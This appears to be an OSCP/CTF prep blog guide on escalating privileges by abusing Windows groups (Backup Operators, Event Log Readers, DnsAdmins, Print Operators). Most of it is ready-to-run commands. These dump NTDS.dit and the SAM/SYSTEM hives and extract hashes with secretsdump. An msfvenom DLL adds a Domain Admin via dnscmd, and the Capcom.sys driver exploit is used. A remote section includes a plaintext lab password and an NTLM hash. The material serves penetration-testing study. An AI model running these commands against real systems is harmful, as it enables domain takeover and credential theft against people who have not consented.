---
title: "Abusing Windows Groups"
date: 2025-08-08
categories: ["CTF", "OSCP Prep", "Windows", "PE"]
tags: ["Windows", "Windows Group Abuse", "privilege escalation", "Backup Operator", "Event Log Readers", "DnsAdmins", "Print Operators"]
description: "Techniques with guides on how to exploit various Windows Groups to elevate privileges"
---

# Abusing Windows Group Privileges

Understanding and leveraging Windows group privileges is a critical aspect of system security and penetration testing. This guide delves into the capabilities and potential abuse of several key Windows groups, including their privileges and methods of exploitation.

---
---

## ** Windows Built-in Groups **

**Overview**: Windows built-in groups come with predefined privileges. A detailed list of these groups and their functionalities is available:

- [Windows Built-in Groups](https://ss64.com/nt/syntax-security_groups.html)
- [Privileged Accounts and Groups in Active Directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)

---
---

# Backup Operators
```powershell
## List our current group membership
whoami /groups

## Assuming we are in the `Backup Operators` group
## Memebers of this group grant the following privilages:
- SeBckup
- SeRestore

## SeBackup
Allows us to copy a file from a folder, even if there are access controls in place (ACE,ACL).
```
## References

## We can use the following `PoC` to exploit `SeBackupPrivilege`
(1) [PoC](https://github.com/giuliano108/SeBackupPrivilege)

## Pre-Build DLLs.
(2) [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)

(3) [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)

## Importing Libraries
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
## Verifying SeBackupPrivilege is Enabled
```powershell
## This is applicable after importinh the abovementioned dll(s)
Get-SeBackupPrivilege ## OR whoami /priv

ΝΟΤΕ ΙF You do not get the privilege try downloading pre-build binaries on resource (2)

```
## Enabling SeBackupPrivilege
```powershell
## If the privilege is disabled, we can enable it with:
Set-SeBackupPrivilege
## Re-Check
Get-SeBackupPrivilege
```
## Copying a Protected File
```powershell
## Trying to cat the file to see that access is denied.
cat 'C:\Confidential\2021 Contract.txt'
## Using the following commnad however, we can copy the file over and read it
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat Contract.txt
```
## Attacking a Domain Controller - Copying NTDS.dit
```mysql
This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.
```

```powershell
## As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow] utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

PS C:\htb> diskshadow.exe

DISKSHADOW> set verbose on;
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab;
DISKSHADOW> set context clientaccessible;
DISKSHADOW> set context persistent;
DISKSHADOW> begin backup;
DISKSHADOW> add volume C: alias cdrive;
DISKSHADOW> create;
DISKSHADOW> expose %cdrive% E:;
DISKSHADOW> end backup;
DISKSHADOW> exit;

PS C:\htb> dir E:
```
## Copying NTDS.dit Locally
```powershell
## Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
## Backing up SAM and SYSTEM Registry Hives
```powershell
## The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
C:\htb> reg save HKLM\SAM SAM.SAV
```
## Extracting Credentials from NTDS.dit
```mysql
With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`
```
## Using DSInternals-psd1 (Extracting Creds from NTDS)
```powershell
Import-Module .\DSInternals.psd1

$key = Get-BootKey -SystemHivePath .\SYSTEM

Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
## Using Secretsdump.py
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
## Robocopy
## Copying Files with Robocopy
```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

## BACKUP OPERATOR REMOTELY
```bash
# Start an SMB Server
sudo impacket-smbserver share -smb2support ~/Documents/OSCP/Medtech/WEB02

# Backup SAM SECURITY SYSTEM to your Share
sudo impacket-reg medtech.com/joe:Flowers1@172.16.152.10 backup -o '\\172.16.152.11\C$'


# OR TRY and backup on some other share in the same network!
# If file is big try the following command
smbclient -m SMB2 '//172.16.152.10/C$' -c 'timeout 120; iosize 16384; get \"SYSTEM.save"' -U 'medtech.com\joe'


# Dumping 
sudo impacket-secretsdump -system SYSTEM.save -sam SAM.save -security SECURITY.save LOCAL
# (Grab the $MACHINE.ACC)
# $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ee911203143a7c6fcfee95034f673f57

# Use the machine account hash with the machine account NAME against the DC
sudo impacket-secretsdump medtech.com/'DC01$'@172.16.152.10 -hashes ':ee911203143a7c6fcfee95034f673f57'
```

---
---

# **Event Log Readers**

This group allows reading event logs, including sensitive logs like Security logs (Event ID 4688).

**Commands:**

1. **Confirm Membership:**
   ```cmd
   net localgroup "Event Log Readers"
   net user logger
   ```

2. **Search Security Logs:**
   - Using `wevtutil`:
     ```cmd
     wevtutil qe Security /rd:true /f:text | Select-String "/user"
     ```
   - Using `Get-WinEvent`:
     ```cmd
     Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
     ```

---
---

# **DnsAdmins**

DnsAdmins group members can load arbitrary DLLs into the DNS service, which runs as `NT AUTHORITY\SYSTEM`.

**Exploitation Steps:**

1. **Generate Malicious DLL:**
   ```bash
   msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
   ```

2. **Load DLL:**
   ```cmd
   dnscmd.exe /config /serverlevelplugindll C:\Path\adduser.dll
   sc stop dns
   sc start dns
   ```

3. **Clean Up:**
   ```cmd
   reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
   ```

---
---

# **Print Operators**

Print Operators group grants the `SeLoadDriverPrivilege`, enabling members to load drivers.

**Commands and Exploits:**

1. **Confirm Privileges:**
   ```cmd
   whoami /priv
   ```

2. **Exploit Capcom.sys Driver:**
   - Download `Capcom.sys` and exploit tool:
     ```cmd
     reg add HKCU\System\CurrentControlSet\Capcom /v ImagePath /t REG_SZ /d "\??\C:\temp\Capcom.sys"
     ```

   - Verify and exploit:
     ```cmd
     EnableSeLoadDriverPrivilege.exe
     .\ExploitCapcom.exe
     ```

3. **Clean Up:**
   ```cmd
   reg delete HKCU\System\CurrentControlSet\Capcom
   ```

---
---

